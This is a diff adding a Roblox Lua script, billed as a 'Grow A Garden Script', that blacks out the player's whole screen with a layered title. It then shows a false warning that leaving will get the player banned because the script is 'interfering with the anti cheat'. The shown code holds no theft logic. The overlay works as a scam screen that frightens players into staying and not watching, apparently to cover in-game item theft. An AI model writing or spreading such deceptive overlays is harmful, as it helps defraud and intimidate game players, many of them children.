@@ -1,0 +1,48 @@
+-- Grow A Garden Script UI with Layered Text (No Wave)
+-- Black screen, layered title, smaller anti-cheat text, no equipment
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "GrowAGardenScript"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Full black background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Parent = gui
+
+-- Layered title text
+local titleText = "Grow A Garden Script"
+local layers = 5
+
+for i = 1, layers do
+    local textLayer = Instance.new("TextLabel")
+    textLayer.Size = UDim2.new(1, 0, 0, 100)
+    -- Slight offset for the layered look
+    textLayer.Position = UDim2.new(0, i * 2, 0.3, i * 2)
+    textLayer.BackgroundTransparency = 1
+    textLayer.Text = titleText
+    textLayer.Font = Enum.Font.FredokaOne
+    textLayer.TextScaled = true
+
+    -- Slight color offset for depth
+    local colorOffset = 255 - (i * 25)
+    textLayer.TextColor3 = Color3.fromRGB(255, colorOffset, colorOffset)
+
+    textLayer.Parent = bg
+end
+
+-- Smaller anti-cheat warning
+local warning = Instance.new("TextLabel")
+warning.Size = UDim2.new(1, -100, 0, 150) -- Slightly smaller height
+warning.Position = UDim2.new(0.5, -500/2, 0.4, 100)
+warning.BackgroundTransparency = 1
+warning.Text = "IMPORTANT: If u leave now u will get banned as the\nscript is currently interfering with the anti cheat"
+warning.Font = Enum.Font.FredokaOne
+warning.TextColor3 = Color3.fromRGB(170, 150, 255)
+warning.TextScaled = true
+warning.TextWrapped = true
+warning.Parent = bg
